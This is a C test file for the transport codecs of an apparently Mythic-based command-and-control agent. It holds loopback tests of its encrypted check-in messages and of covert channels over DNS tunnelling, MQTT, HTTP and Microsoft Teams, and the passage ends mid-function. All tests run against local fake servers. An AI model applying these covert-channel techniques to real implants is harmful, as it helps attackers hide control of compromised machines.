/* Transport codec + loopback tests. Test-only; never linked into the agent.
 *
 * Build: zig cc -target x86_64-windows-gnu codec_test.c crypto.c cJSON.c
 *   sock.c mqtt.c dns.c http.c teams.c -lbcrypt -lwinhttp -lws2_32
 *   -o codec.exe && wine codec.exe (exit 0 = pass)
 */
#include "common.h"
#include "crypto.h"
#include "dns.h"
#include "http.h"
#include "mqtt.h"
#include "sock.h"
#include "teams.h"
#include "cJSON.h"
#include <stdio.h>

static int failures = 0;

#define CHECK(cond, ...) do { \
    if (!(cond)) { \
        printf("FAIL %s:%d: ", __FILE__, __LINE__); \
        printf(__VA_ARGS__); \
        printf("\n"); \
        failures++; \
    } \
} while (0)

static const char *TUUID = "11111111-2222-3333-4444-555555555555";

static void test_crypto_raw(void) {
    unsigned char psk[32];
    const char *msg = "{\"action\":\"checkin\"}";
    bytebuf_t raw = {0}, out = {0};
    char uuid[37];
    memset(psk, 0x42, sizeof(psk));
    CHECK(mythic_seal_raw(TUUID, (const unsigned char *)msg, strlen(msg), "none", NULL, &raw) == 0, "seal none");
    CHECK(raw.len == 36 + strlen(msg) && memcmp(raw.data, TUUID, 36) == 0, "none layout");
    CHECK(mythic_open_raw(raw.data, raw.len, "none", NULL, uuid, &out) == 0, "open none");
    CHECK(strcmp(uuid, TUUID) == 0 && out.len == strlen(msg), "none roundtrip");
    bytebuf_free(&raw);
    bytebuf_free(&out);
    CHECK(mythic_seal_raw(TUUID, (const unsigned char *)msg, strlen(msg), "aes256_hmac", psk, &raw) == 0, "seal aes");
    CHECK(mythic_open_raw(raw.data, raw.len, "aes256_hmac", psk, uuid, &out) == 0, "open aes");
    CHECK(strcmp(uuid, TUUID) == 0 && out.len == strlen(msg) && memcmp(out.data, msg, out.len) == 0, "aes roundtrip");
    bytebuf_free(&raw);
    bytebuf_free(&out);
    /* Tamper must fail. */
    CHECK(mythic_seal_raw(TUUID, (const unsigned char *)msg, strlen(msg), "aes256_hmac", psk, &raw) == 0, "seal aes2");
    raw.data[raw.len - 1] ^= 0xFF;
    CHECK(mythic_open_raw(raw.data, raw.len, "aes256_hmac", psk, uuid, &out) != 0, "tamper accepted");
    bytebuf_free(&raw);
    bytebuf_free(&out);
}

static void test_dns_codec(void) {
    dns_pkt_t p, got;
    bytebuf_t m = {0}, data = {0};
    unsigned char want[] = {0x08, 0x01, 0x10, 0xAC, 0x02, 0x18, 0x01,
                            0x20, 0x02, 0x28, 0x01, 0x32, 0x02, 0x41, 0x42};
    memset(&p, 0, sizeof(p));
    p.action = 1;
    p.session = 300;
    p.msgid = 1;
    p.total = 2;
    p.current = 1;
    p.data = (const unsigned char *)"AB";
    p.data_len = 2;
    CHECK(dns_marshal(&p, &m) == 0, "marshal");
    CHECK(m.len == sizeof(want) && memcmp(m.data, want, sizeof(want)) == 0, "marshal golden");
    CHECK(dns_unmarshal(m.data, m.len, &got, &data) == 0, "unmarshal");
    CHECK(got.action == 1 && got.session == 300 && got.msgid == 1 && got.total == 2 &&
              got.current == 1 && data.len == 2 && memcmp(data.data, "AB", 2) == 0,
          "unmarshal fields");
    bytebuf_free(&m);
    bytebuf_free(&data);
    {
        char *b32 = b32_encode((const unsigned char *)"AB", 2);
        CHECK(b32 && strcmp(b32, "ifba") == 0, "b32 golden (%s)", b32 ? b32 : "null");
        free(b32);
    }
}

/* ---------- loopback helpers ---------- */

static int test_port = 0;
static HANDLE ready_ev = NULL;

static SOCKET test_listen(int type) {
    SOCKET s;
    struct sockaddr_in addr;
    int len = sizeof(addr);
    WSADATA wsa;
    WSAStartup(MAKEWORD(2, 2), &wsa);
    s = socket(AF_INET, type, 0);
    if (s == INVALID_SOCKET)
        return INVALID_SOCKET;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
    if (bind(s, (struct sockaddr *)&addr, sizeof(addr)) != 0) {
        closesocket(s);
        return INVALID_SOCKET;
    }
    if (type == SOCK_STREAM && listen(s, 1) != 0) {
        closesocket(s);
        return INVALID_SOCKET;
    }
    if (getsockname(s, (struct sockaddr *)&addr, &len) != 0) {
        closesocket(s);
        return INVALID_SOCKET;
    }
    test_port = ntohs(addr.sin_port);
    if (ready_ev)
        SetEvent(ready_ev);
    return s;
}

static int wait_ready(void) {
    if (!ready_ev)
        return -1;
    return WaitForSingleObject(ready_ev, 10000) == WAIT_OBJECT_0 ? 0 : -1;
}

static int t_recv_all(SOCKET s, unsigned char *b, size_t n) {
    size_t off = 0;
    int to = 15000;
    setsockopt(s, SOL_SOCKET, SO_RCVTIMEO, (const char *)&to, sizeof(to));
    while (off < n) {
        int r = recv(s, (char *)b + off, (int)(n - off), 0);
        if (r <= 0)
            return -1;
        off += (size_t)r;
    }
    return 0;
}

static int t_send_all(SOCKET s, const unsigned char *b, size_t n) {
    size_t off = 0;
    while (off < n) {
        int r = send(s, (const char *)b + off, (int)(n - off), 0);
        if (r <= 0)
            return -1;
        off += (size_t)r;
    }
    return 0;
}

/* ---------- mqtt loopback ---------- */

static char mqtt_reply_b64[8192];
static char mqtt_got_topic[160];
static char mqtt_got_payload[8192];

static int mqtt_t_read(SOCKET c, unsigned char *fixed, unsigned char **body, size_t *len) {
    unsigned char fb, b;
    size_t n = 0, mult = 1;
    if (t_recv_all(c, &fb, 1))
        return -1;
    do {
        if (t_recv_all(c, &b, 1))
            return -1;
        n += (size_t)(b & 0x7F) * mult;
        mult *= 128;
    } while (b & 0x80);
    *body = (unsigned char *)malloc(n + 1);
    if (!*body && n > 0)
        return -1;
    if (n > 0 && t_recv_all(c, *body, n)) {
        free(*body);
        return -1;
    }
    (*body)[n] = '\0';
    *fixed = fb;
    *len = n;
    return 0;
}

static int mqtt_t_write(SOCKET c, unsigned char fixed, const unsigned char *body, size_t len) {
    unsigned char hdr[6];
    size_t hlen = 1, n = len;
    hdr[0] = fixed;
    do {
        unsigned char b = (unsigned char)(n % 128);
        n /= 128;
        if (n > 0)
            b |= 0x80;
        hdr[hlen++] = b;
    } while (n > 0);
    if (t_send_all(c, hdr, hlen))
        return -1;
    return t_send_all(c, body, len);
}

static DWORD WINAPI mqtt_fake(LPVOID arg) {
    SOCKET ln, c;
    unsigned char fixed, *body = NULL;
    size_t len = 0;
    unsigned tlen;
    char sub[160];
    int rc = 1;
    (void)arg;
    ln = test_listen(SOCK_STREAM);
    if (ln == INVALID_SOCKET)
        return 1;
    c = accept(ln, NULL, NULL);
    closesocket(ln);
    if (c == INVALID_SOCKET)
        return 1;
    /* CONNECT -> CONNACK */
    if (mqtt_t_read(c, &fixed, &body, &len) || fixed != 0x10)
        goto done;
    free(body);
    body = NULL;
    {
        unsigned char ok[] = {0x00, 0x00};
        if (mqtt_t_write(c, 0x20, ok, 2))
            goto done;
    }
    /* SUBSCRIBE -> SUBACK */
    if (mqtt_t_read(c, &fixed, &body, &len) || fixed != 0x82 || len < 5)
        goto done;
    tlen = ((unsigned)body[2] << 8) | body[3];
    if (4 + tlen > len || tlen >= sizeof(sub))
        goto done;
    memcpy(sub, body + 4, tlen);
    sub[tlen] = '\0';
    {
        unsigned char sack[] = {body[0], body[1], 0x01};
        free(body);
        body = NULL;
        if (mqtt_t_write(c, 0x90, sack, 3))
            goto done;
    }
    /* PUBLISH -> PUBACK, capture topic + payload */
    if (mqtt_t_read(c, &fixed, &body, &len) || fixed != 0x32 || len < 4)
        goto done;
    tlen = ((unsigned)body[0] << 8) | body[1];
    if (2 + tlen + 2 > len || tlen >= sizeof(mqtt_got_topic))
        goto done;
    {
        unsigned char ack[] = {body[2 + tlen], body[3 + tlen]};
        size_t paylen = len - 4 - tlen;
        memcpy(mqtt_got_topic, body + 2, tlen);
        mqtt_got_topic[tlen] = '\0';
        if (paylen >= sizeof(mqtt_got_payload))
            goto done;
        memcpy(mqtt_got_payload, body + 4 + tlen, paylen);
        mqtt_got_payload[paylen] = '\0';
        free(body);
        body = NULL;
        if (mqtt_t_write(c, 0x40, ack, 2))
            goto done;
    }
    /* Reply PUBLISH qos1 on the subscribed topic, expect PUBACK. */
    {
        size_t rlen = strlen(mqtt_reply_b64), slen = strlen(sub);
        unsigned char *rp = (unsigned char *)malloc(2 + slen + 2 + rlen);
        if (!rp)
            goto done;
        rp[0] = (unsigned char)(slen >> 8);
        rp[1] = (unsigned char)slen;
        memcpy(rp + 2, sub, slen);
        rp[2 + slen] = 0x00;
        rp[3 + slen] = 0x07;
        memcpy(rp + 4 + slen, mqtt_reply_b64, rlen);
        rc = mqtt_t_write(c, 0x32, rp, 4 + slen + rlen);
        free(rp);
        if (rc)
            goto done;
    }
    if (mqtt_t_read(c, &fixed, &body, &len) || fixed != 0x40)
        goto done;
    rc = 0;
done:
    free(body);
    closesocket(c);
    return rc;
}

static void test_mqtt_exchange(void) {
    agent_config_t cfg;
    HANDLE th;
    DWORD tid;
    unsigned char *out = NULL;
    size_t outlen = 0;
    char *sealed_b64 = NULL;
    unsigned char sealed[128], reply[128];
    size_t sealed_len, reply_len;
    memset(&cfg, 0, sizeof(cfg));
    sealed_len = (size_t)sprintf((char *)sealed, "%s{\"action\":\"checkin\"}", TUUID);
    reply_len = (size_t)sprintf((char *)reply, "%s{\"action\":\"checkin\",\"status\":\"success\"}", TUUID);
    {
        char *r64 = b64_encode(reply, reply_len, NULL);
        if (!r64) {
            CHECK(0, "mqtt b64");
            return;
        }
        strncpy(mqtt_reply_b64, r64, sizeof(mqtt_reply_b64) - 1);
        free(r64);
    }
    ready_ev = CreateEvent(NULL, TRUE, FALSE, NULL);
    th = CreateThread(NULL, 0, mqtt_fake, NULL, 0, &tid);
    if (!th || wait_ready() != 0) {
        CHECK(0, "mqtt fake start");
        return;
    }
    snprintf(cfg.mqtt_server, sizeof(cfg.mqtt_server), "127.0.0.1");
    snprintf(cfg.mqtt_port, sizeof(cfg.mqtt_port), "%d", test_port);
    snprintf(cfg.mqtt_use_ssl, sizeof(cfg.mqtt_use_ssl), "False");
    snprintf(cfg.mqtt_client, sizeof(cfg.mqtt_client), "test");
    snprintf(cfg.mqtt_topic, sizeof(cfg.mqtt_topic), "base/");
    snprintf(cfg.mqtt_mythic, sizeof(cfg.mqtt_mythic), "1");
    snprintf(cfg.mqtt_taskcheck, sizeof(cfg.mqtt_taskcheck), "2");
    CHECK(mqtt_exchange(&cfg, sealed, sealed_len, &out, &outlen) == 0, "mqtt exchange");
    WaitForSingleObject(th, 30000);
    CloseHandle(th);
    CloseHandle(ready_ev);
    ready_ev = NULL;
    if (out) {
        CHECK(outlen == reply_len && memcmp(out, reply, reply_len) == 0, "mqtt reply bytes");
        free(out);
    } else {
        CHECK(0, "mqtt no reply");
    }
    CHECK(strcmp(mqtt_got_topic, "base/2") == 0, "mqtt topic (%s)", mqtt_got_topic);
    sealed_b64 = b64_encode(sealed, sealed_len, NULL);
    CHECK(sealed_b64 && strcmp(mqtt_got_payload, sealed_b64) == 0, "mqtt payload b64");
    free(sealed_b64);
}

/* ---------- dns loopback ---------- */

static unsigned char dns_expected[2048];
static size_t dns_expected_len;
static unsigned char dns_reply[2048];
static size_t dns_reply_len;
static int dns_chunk;
static unsigned dns_qtype;
static volatile int dns_stop;

static int b32_val(char c) {
    if (c >= 'A' && c <= 'Z')
        return c - 'A';
    if (c >= 'a' && c <= 'z')
        return c - 'a';
    if (c >= '2' && c <= '7')
        return c - '2' + 26;
    return -1;
}

static unsigned char *test_b32_decode(const char *s, size_t *outlen) {
    size_t n = strlen(s);
    unsigned char *dst = (unsigned char *)malloc(n * 5 / 8 + 2);
    size_t j = 0;
    unsigned acc = 0;
    int bits = 0, i;
    *outlen = 0;
    if (!dst)
        return NULL;
    for (i = 0; s[i]; i++) {
        int v = b32_val(s[i]);
        if (v < 0) {
            free(dst);
            return NULL;
        }
        acc = (acc << 5) | (unsigned)v;
        bits += 5;
        if (bits >= 8) {
            bits -= 8;
            dst[j++] = (unsigned char)(acc >> bits);
        }
    }
    *outlen = j;
    return dst;
}

typedef struct {
    unsigned char *chunks[128];
    size_t lens[128];
    unsigned total;
    unsigned got;
    unsigned msgid;
    int active;
} dns_upload_t;

static int dns_t_send(SOCKET s, struct sockaddr_in *to, const unsigned char *b, size_t n) {
    return sendto(s, (const char *)b, (int)n, 0, (struct sockaddr *)to, sizeof(*to)) < 0 ? -1 : 0;
}

static DWORD WINAPI dns_fake(LPVOID arg) {
    SOCKET s;
    dns_upload_t up;
    unsigned char buf[4096];
    int to = 200;
    (void)arg;
    memset(&up, 0, sizeof(up));
    s = test_listen(SOCK_DGRAM);
    if (s == INVALID_SOCKET)
        return 1;
    setsockopt(s, SOL_SOCKET, SO_RCVTIMEO, (const char *)&to, sizeof(to));
    while (!dns_stop) {
        struct sockaddr_in from;
        int fromlen = sizeof(from), n, off, qtype;
        char joined[2048];
        size_t jlen = 0;
        unsigned char *raw;
        size_t rawlen;
        dns_pkt_t pkt;
        bytebuf_t pdata = {0};
        unsigned char rep[4096], *w;
        size_t replen;
        n = recvfrom(s, (char *)buf, sizeof(buf), 0, (struct sockaddr *)&from, &fromlen);
        if (n <= 0)
            continue;
        if (n < 14)
            continue;
        /* Parse qname labels, strip the trailing domain labels. */
        off = 12;
        joined[0] = '\0';
        {
            char labels[64][64];
            int nl = 0, li;
            while (off < n && buf[off] != 0 && nl < 64) {
                unsigned llen = buf[off++];
                if (off + (int)llen > n || llen >= sizeof(labels[0]))
                    break;
                memcpy(labels[nl], buf + off, llen);
                labels[nl][llen] = '\0';
                nl++;
                off += (int)llen;
            }
            off++;
            /* "dns.example.com" = 3 labels; match suffix, keep the rest. */
            if (nl < 4 || strcmp(labels[nl - 1], "com") != 0 ||
                strcmp(labels[nl - 2], "example") != 0 || strcmp(labels[nl - 3], "dns") != 0)
                continue;
            for (li = 0; li < nl - 3; li++) {
                size_t l = strlen(labels[li]);
                if (jlen + l >= sizeof(joined) - 1)
                    break;
                memcpy(joined + jlen, labels[li], l);
                jlen += l;
            }
            joined[jlen] = '\0';
        }
        qtype = (buf[off] << 8) | buf[off + 1];
        raw = test_b32_decode(joined, &rawlen);
        if (!raw)
            continue;
        if (dns_unmarshal(raw, rawlen, &pkt, &pdata) != 0) {
            free(raw);
            continue;
        }
        free(raw);
        /* Build reply: id, flags, qd=1, answers. */
        rep[0] = buf[0];
        rep[1] = buf[1];
        memcpy(rep + 2, "\x81\x80\x00\x01", 4);
        w = rep + 12;
        /* Placeholders for ANCOUNT, patched later. */
        rep[6] = 0;
        rep[7] = 0;
        {
            int qend = off + 4;
            memcpy(w, buf + 12, (size_t)(qend - 12));
            w += qend - 12;
        }
        {
            int an = 0;
            unsigned action = 0;
            unsigned char *answers[300];
            size_t alens[300];
            unsigned char abuf[300][16];
            char atxt[2][2100];
            int i;
            if (pkt.action == 0) {
                if (!up.active || up.msgid != pkt.msgid) {
                    for (i = 0; i < 128; i++)
                        free(up.chunks[i]);
                    memset(&up, 0, sizeof(up));
                    up.active = 1;
                    up.msgid = pkt.msgid;
                    up.total = pkt.total;
                }
                if (pkt.current < 128 && !up.chunks[pkt.current]) {
                    up.chunks[pkt.current] = (unsigned char *)malloc(pkt.data_len ? pkt.data_len : 1);
                    memcpy(up.chunks[pkt.current], pkt.data, pkt.data_len);
                    up.lens[pkt.current] = pkt.data_len;
                    up.got++;
                }
                if (up.got == up.total && up.total > 0) {
                    unsigned char full[2048];
                    size_t flen = 0;
                    for (i = 0; (unsigned)i < up.total; i++) {
                        memcpy(full + flen, up.chunks[i], up.lens[i]);
                        flen += up.lens[i];
                    }
                    if (flen != dns_expected_len || memcmp(full, dns_expected, flen) != 0)
                        printf("FAIL dns fake: upload mismatch (%u != %u)\n", (unsigned)flen,
                               (unsigned)dns_expected_len);
                    action = 1;
                }
                /* Single action answer. */
                if (qtype == 16) {
                    atxt[0][0] = (char)('0' + action);
                    atxt[0][1] = '\0';
                    answers[0] = NULL;
                    alens[0] = 0;
                    an = 1;
                } else {
                    memset(abuf[0], 0, qtype == 28 ? 16 : 4);
                    abuf[0][qtype == 28 ? 15 : 3] = (unsigned char)action;
                    answers[0] = abuf[0];
                    alens[0] = qtype == 28 ? 16 : 4;
                    an = 1;
                }
            } else {
                unsigned total = (unsigned)((dns_reply_len + (size_t)dns_chunk - 1) / dns_chunk);
                unsigned start = pkt.current * (unsigned)dns_chunk, end = start + (unsigned)dns_chunk;
                dns_pkt_t rp;
                bytebuf_t rm = {0};
                action = 1;
                if (end > dns_reply_len)
                    end = (unsigned)dns_reply_len;
                memset(&rp, 0, sizeof(rp));
                rp.action = 1;
                rp.session = pkt.session;
                rp.msgid = pkt.msgid;
                rp.total = total;
                rp.current = pkt.current;
                rp.data = dns_reply + start;
                rp.data_len = end - start;
                dns_marshal(&rp, &rm);
                if (qtype == 16) {
                    char *e = b64_encode(rm.data, rm.len, NULL);
                    atxt[0][0] = '1';
                    atxt[0][1] = '\0';
                    answers[0] = NULL;
                    strncpy(atxt[1], e ? e : "", sizeof(atxt[1]) - 1);
                    answers[1] = NULL;
                    free(e);
                    an = 2;
                } else {
                    size_t size = qtype == 28 ? 15 : 3, idx = 0;
                    unsigned order = 1;
                    memset(abuf[0], 0, size + 1);
                    abuf[0][size] = 1;
                    answers[0] = abuf[0];
                    alens[0] = size + 1;
                    an = 1;
                    for (idx = 0; idx < rm.len; idx += size) {
                        size_t end2 = idx + size, rem = 0;
                        int exact = 0;
                        unsigned char *ch = abuf[an];
                        if (end2 > rm.len) {
                            rem = end2 - rm.len;
                            end2 = rm.len;
                        } else if (end2 == rm.len) {
                            exact = 1;
                        }
                        memset(ch, 0, size + 1);
                        memcpy(ch + 1, rm.data + idx, end2 - idx);
                        ch[0] = (unsigned char)order++;
                        for (n = (int)size; n > (int)(size - rem); n--)
                            ch[n] = (unsigned char)rem;
                        answers[an] = ch;
                        alens[an] = size + 1;
                        an++;
                        if (exact && an < 300) {
                            memset(abuf[an], (int)size, size + 1);
                            abuf[an][0] = (unsigned char)order++;
                            answers[an] = abuf[an];
                            alens[an] = size + 1;
                            an++;
                        }
                    }
                }
                bytebuf_free(&rm);
            }
            rep[7] = (unsigned char)an;
            for (i = 0; i < an; i++) {
                *w++ = 0xC0;
                *w++ = 0x0C;
                *w++ = (unsigned char)(qtype >> 8);
                *w++ = (unsigned char)qtype;
                *w++ = 0;
                *w++ = 1;
                *w++ = 0;
                *w++ = 0;
                *w++ = 0;
                *w++ = 0;
                if (qtype == 16) {
                    size_t sl = strlen(atxt[i]), oo = 0;
                    /* TXT rdata: length-prefixed strings. */
                    unsigned char tmp[2200];
                    size_t tlen = 0;
                    while (oo < sl) {
                        size_t cn = sl - oo > 255 ? 255 : sl - oo;
                        tmp[tlen++] = (unsigned char)cn;
                        memcpy(tmp + tlen, atxt[i] + oo, cn);
                        tlen += cn;
                        oo += cn;
                    }
                    *w++ = (unsigned char)(tlen >> 8);
                    *w++ = (unsigned char)tlen;
                    memcpy(w, tmp, tlen);
                    w += tlen;
                } else {
                    *w++ = (unsigned char)(alens[i] >> 8);
                    *w++ = (unsigned char)alens[i];
                    memcpy(w, answers[i], alens[i]);
                    w += alens[i];
                }
            }
        }
        replen = (size_t)(w - rep);
        dns_t_send(s, &from, rep, replen);
        bytebuf_free(&pdata);
    }
    closesocket(s);
    return 0;
}

static void test_dns_exchange_one(unsigned qtype, int chunk, size_t sealed_extra, size_t reply_extra) {
    agent_config_t cfg;
    dns_state_t st;
    HANDLE th;
    DWORD tid;
    unsigned char *out = NULL;
    size_t outlen = 0, i;
    memset(&cfg, 0, sizeof(cfg));
    memset(&st, 0, sizeof(st));
    dns_expected_len = (size_t)sprintf((char *)dns_expected, "%s{\"action\":\"checkin\"}", TUUID);
    for (i = 0; i < sealed_extra; i++)
        dns_expected[dns_expected_len++] = 'D';
    dns_reply_len = (size_t)sprintf((char *)dns_reply, "%s{\"action\":\"checkin\",\"status\":\"success\"}", TUUID);
    for (i = 0; i < reply_extra; i++)
        dns_reply[dns_reply_len++] = 'R';
    dns_chunk = chunk;
    dns_qtype = qtype;
    dns_stop = 0;
    ready_ev = CreateEvent(NULL, TRUE, FALSE, NULL);
    th = CreateThread(NULL, 0, dns_fake, NULL, 0, &tid);
    if (!th || wait_ready() != 0) {
        CHECK(0, "dns fake start");
        return;
    }
    strncpy(cfg.dns_domains[0], "dns.example.com", sizeof(cfg.dns_domains[0]) - 1);
    cfg.dns_domain_count = 1;
    snprintf(cfg.dns_server, sizeof(cfg.dns_server), "127.0.0.1:%d", test_port);
    snprintf(cfg.dns_record, sizeof(cfg.dns_record), "%s", qtype == 16 ? "TXT" : "A");
    cfg.dns_max_query = 200;
    cfg.dns_max_sub = 40;
    CHECK(dns_exchange(&cfg, &st, dns_expected, dns_expected_len, &out, &outlen) == 0,
          "dns exchange qtype=%u", qtype);
    dns_stop = 1;
    WaitForSingleObject(th, 10000);
    CloseHandle(th);
    CloseHandle(ready_ev);
    ready_ev = NULL;
    if (out) {
        CHECK(outlen == dns_reply_len && memcmp(out, dns_reply, outlen) == 0,
              "dns reply bytes qtype=%u", qtype);
        free(out);
    } else {
        CHECK(0, "dns no reply qtype=%u", qtype);
    }
}

static void test_dns_query_bounds(void) {
    agent_config_t cfg;
    dns_pkt_t p;
    bytebuf_t m = {0};
    char qname[512];
    memset(&cfg, 0, sizeof(cfg));
    memset(&p, 0, sizeof(p));
    cfg.dns_max_query = 120;
    cfg.dns_max_sub = 30;
    p.session = 1;
    p.msgid = 2;
    p.total = 1;
    p.data = (const unsigned char *)"hello";
    p.data_len = 5;
    CHECK(dns_marshal(&p, &m) == 0, "bound marshal");
    CHECK(dns_build_query(&cfg, "dns.example.com", m.data, m.len, qname, sizeof(qname)) == 0,
          "bound build");
    CHECK(strlen(qname) <= 120, "bound length");
    {
        const char *s = qname;
        int ok = 1;
        while (*s) {
            const char *dot = strchr(s, '.');
            size_t l = dot ? (size_t)(dot - s) : strlen(s);
            if (l > 63)
                ok = 0;
            if (!dot)
                break;
            s = dot + 1;
        }
        CHECK(ok, "bound labels");
    }
    cfg.dns_max_query = 20;
    CHECK(dns_build_query(&cfg, "dns.example.com", m.data, m.len, qname, sizeof(qname)) != 0,
          "tiny budget accepted");
    bytebuf_free(&m);
}

/* ---------- teams loopback ---------- */

static char *teams_ids[64];
static char *teams_msgs[64];
static int teams_n = 0;
static int teams_authn = 0;
static char teams_auto[8192];
static volatile int teams_stop;

static int teams_t_recv_req(SOCKET c, char **head_out, unsigned char **body_out, size_t *body_len) {
    size_t cap = 4096, len = 0, clen = 0;
    char *buf = (char *)malloc(cap);
    char *hdr;
    *head_out = NULL;
    *body_out = NULL;
    *body_len = 0;
    if (!buf)
        return -1;
    for (;;) {
        int r;
        if (len + 1024 > cap) {
            char *g;
            cap *= 2;
            if (cap > 1024 * 1024) {
                free(buf);
                return -1;
            }
            g = (char *)realloc(buf, cap);
            if (!g) {
                free(buf);
                return -1;
            }
            buf = g;
        }
        r = recv(c, buf + len, 1024, 0);
        if (r <= 0) {
            free(buf);
            return -1;
        }
        len += (size_t)r;
        buf[len] = '\0';
        hdr = strstr(buf, "\r\n\r\n");
        if (hdr) {
            char *cl = strstr(buf, "Content-Length:");
            size_t hlen;
            if (cl && cl < hdr)
                clen = (size_t)atoi(cl + 15);
            hlen = (size_t)(hdr + 4 - buf);
            while (len < hlen + clen) {
                if (len + 1024 > cap) {
                    free(buf);
                    return -1;
                }
                r = recv(c, buf + len, 1024, 0);
                if (r <= 0) {
                    free(buf);
                    return -1;
                }
                len += (size_t)r;
            }
            buf[len] = '\0';
            *head_out = buf;
            if (clen > 0) {
                *body_out = (unsigned char *)malloc(clen + 1);
                if (!*body_out) {
                    free(buf);
                    return -1;
                }
                memcpy(*body_out, buf + hlen, clen);
                (*body_out)[clen] = '\0';
                *body_len = clen;
            }
            return 0;
        }
    }
}

static void teams_t_send(SOCKET c, int status, const char *body) {
    char hdr[256];
    size_t blen = strlen(body);
    snprintf(hdr, sizeof(hdr),
             "HTTP/1.0 %d OK\r\nContent-Type: application/json\r\nContent-Length: %u\r\nConnection: close\r\n\r\n",
             status, (unsigned)blen);
    t_send_all(c, (const unsigned char *)hdr, strlen(hdr));
    t_send_all(c, (const unsigned char *)body, blen);
}

static const char *tjstr(cJSON *o, const char *k);

static char *tdup(const char *s) {
    size_t n = strlen(s) + 1;
    char *d = (char *)malloc(n);
    if (d)
        memcpy(d, s, n);
    return d;
}

static DWORD WINAPI teams_fake(LPVOID arg) {
    SOCKET ln;
    (void)arg;
    ln = test_listen(SOCK_STREAM);
    if (ln == INVALID_SOCKET)
        return 1;
    while (!teams_stop) {
        fd_set rf;
        struct timeval tv;
        SOCKET c;
        char *head = NULL;
        unsigned char *rbody = NULL;
        size_t rlen = 0;
        FD_ZERO(&rf);
        FD_SET(ln, &rf);
        tv.tv_sec = 0;
        tv.tv_usec = 200000;
        if (select(0, &rf, NULL, NULL, &tv) <= 0)
            continue;
        c = accept(ln, NULL, NULL);
        if (c == INVALID_SOCKET)
            continue;
        if (teams_t_recv_req(c, &head, &rbody, &rlen) != 0) {
            closesocket(c);
            continue;
        }
        if (strstr(head, "/oauth2/v2.0/token")) {
            teams_authn++;
            teams_t_send(c, 200, "{\"access_token\":\"tok123\",\"expires_in\":3600}");
        } else if (strstr(head, "/webhook") && strncmp(head, "POST", 4) == 0) {
            cJSON *root = cJSON_Parse((const char *)rbody);
            cJSON *att = root ? cJSON_GetObjectItemCaseSensitive(root, "attachments") : NULL;
            const char *text = "";
            if (att && cJSON_IsArray(att) && cJSON_GetArraySize(att) > 0) {
                cJSON *card = cJSON_Parse(tjstr(cJSON_GetArrayItem(att, 0), "content"));
                cJSON *barr = card ? cJSON_GetObjectItemCaseSensitive(card, "body") : NULL;
                if (barr && cJSON_IsArray(barr) && cJSON_GetArraySize(barr) > 0)
                    text = tjstr(cJSON_GetArrayItem(barr, 0), "text");
                if (teams_n < 64) {
                    char id[32];
                    snprintf(id, sizeof(id), "wh-%d", teams_n);
                    teams_ids[teams_n] = tdup(id);
                    teams_msgs[teams_n] = tdup(text);
                    teams_n++;
                }
                if (card)
                    cJSON_Delete(card);
            }
            if (root)
                cJSON_Delete(root);
            teams_t_send(c, 202, "{}");
        } else if (strstr(head, "/messages") && strncmp(head, "POST", 4) == 0) {
            cJSON *root = cJSON_Parse((const char *)rbody);
            cJSON *b = root ? cJSON_GetObjectItemCaseSensitive(root, "body") : NULL;
            const char *content = b ? tjstr(b, "content") : "";
            char id[32], resp[64];
            snprintf(id, sizeof(id), "msg-%d", teams_n);
            if (teams_n < 62) {
                teams_ids[teams_n] = tdup(id);
                teams_msgs[teams_n] = tdup(content);
                teams_n++;
                if (teams_auto[0]) {
                    snprintf(id, sizeof(id), "msg-%d", teams_n);
                    teams_ids[teams_n] = tdup(id);
                    teams_msgs[teams_n] = tdup(teams_auto);
                    teams_n++;
                }
            }
            if (root)
                cJSON_Delete(root);
            snprintf(resp, sizeof(resp), "{\"id\":\"%s\"}", teams_ids[teams_n - (teams_auto[0] ? 2 : 1)]);
            teams_t_send(c, 201, resp);
        } else if (strstr(head, "/messages") && strncmp(head, "GET", 3) == 0) {
            cJSON *root = cJSON_CreateObject();
            cJSON *arr = cJSON_AddArrayToObject(root, "value");
            char *out;
            int i;
            for (i = teams_n - 1; i >= 0; i--) {
                cJSON *m = cJSON_CreateObject();
                cJSON *b = cJSON_CreateObject();
                cJSON_AddStringToObject(m, "id", teams_ids[i]);
                cJSON_AddStringToObject(m, "messageType", "message");
                cJSON_AddStringToObject(b, "content", teams_msgs[i]);
                cJSON_AddItemToObject(m, "body", b);
                cJSON_AddItemToArray(arr, m);
            }
            out = cJSON_PrintUnformatted(root);
            teams_t_send(c, 200, out ? out : "{\"value\":[]}");
            free(out);
            cJSON_Delete(root);
        } else {
            teams_t_send(c, 404, "{}");
        }
        free(head);
        free(rbody);
        closesocket(c);
    }
    closesocket(ln);
    return 0;
}

static const char *tjstr(cJSON *o, const char *k);

static char http_got_body[8192];
static char http_reply_b64[8192];

static DWORD WINAPI http_fake(LPVOID arg) {
    SOCKET ln, c;
    char *head = NULL;
    unsigned char *rbody = NULL;
    size_t rlen = 0;
    (void)arg;
    ln = test_listen(SOCK_STREAM);
    if (ln == INVALID_SOCKET)
        return 1;
    c = accept(ln, NULL, NULL);
    closesocket(ln);
    if (c == INVALID_SOCKET)
        return 1;
    if (teams_t_recv_req(c, &head, &rbody, &rlen) != 0) {
        closesocket(c);
        return 1;
    }
    if (strncmp(head, "POST", 4) != 0 || !strstr(head, "/data")) {
        free(head);
        free(rbody);
        closesocket(c);
        return 1;
    }
    strncpy(http_got_body, rbody ? (const char *)rbody : "", sizeof(http_got_body) - 1);
    teams_t_send(c, 200, http_reply_b64);
    free(head);
    free(rbody);
    closesocket(c);
    return 0;
}

static void test_http_exchange(void) {
    agent_config_t cfg;
    HANDLE th;
    DWORD tid;
    unsigned char *out = NULL;
    size_t outlen = 0;
    unsigned char sealed[128], reply[128];
    size_t sealed_len, reply_len;
    char *s64, *r64;
    memset(&cfg, 0, sizeof(cfg));
    sealed_len = (size_t)sprintf((char *)sealed, "%s{\"action\":\"checkin\"}", TUUID);
    reply_len = (size_t)sprintf((char *)reply, "%s{\"action\":\"checkin\",\"status\":\"success\"}", TUUID);
    r64 = b64_encode(reply, reply_len, NULL);
    s64 = b64_encode(sealed, sealed_len, NULL);
    if (!r64 || !s64) {
        CHECK(0, "http b64");
        free(r64);
        free(s64);
        return;
    }
    strncpy(http_reply_b64, r64, sizeof(http_reply_b64) - 1);
    ready_ev = CreateEvent(NULL, TRUE, FALSE, NULL);
    th = CreateThread(NULL, 0, http_fake, NULL, 0, &tid);
    if (!th || wait_ready() != 0) {
        CHECK(0, "http fake start");
        free(r64);
        free(s64);
        return;
    }
